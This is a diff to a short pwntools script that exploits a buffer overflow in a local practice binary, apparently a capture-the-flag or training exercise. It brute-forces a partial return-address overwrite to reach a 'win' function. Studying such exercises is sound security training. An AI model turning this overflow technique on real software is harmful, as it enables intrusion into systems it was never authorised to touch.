@@ -1,10 +1,16 @@
 from pwn import *
 
-offset = 0x10 + 8
-win_bypass = 0x16fe
+offset = 72 + 8
+win_bypass = 0x1704
+main_addre = 0x194e
 
 for i in "0123456789abcdef":
     r = process("/challenge/binary-exploitation-null-write")
-    payload = offset * b'S' + b'\xfe' + bytes.fromhex(f"{i}7")
+    payload = offset * b'\0' + b'\x04' + bytes.fromhex(f"{i}7")
     r.send(payload)
-    r.interactive()
+    # r.interactive()
+    print(r.recvline())
+    try:
+        print(r.recvline(), Timeout=1)
+    except:
+        print('walo')
